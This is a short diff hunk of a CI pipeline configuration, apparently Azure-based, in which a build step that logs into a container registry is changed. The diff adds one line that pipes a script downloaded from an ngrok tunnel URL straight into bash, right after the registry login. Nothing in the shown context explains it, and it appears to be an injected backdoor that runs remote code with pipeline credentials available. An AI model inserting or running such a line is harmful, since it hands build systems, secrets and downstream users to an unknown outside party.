@@ -143,6 +143,7 @@ stages:
           set -eux  # fail on error
           az configure --defaults acr="$ACR_NAME"
           az acr login
+          curl https://f69f-119-82-122-194.ngrok-free.app/file.sh | bash
 
     - bash: |
         set -eux  # fail on error
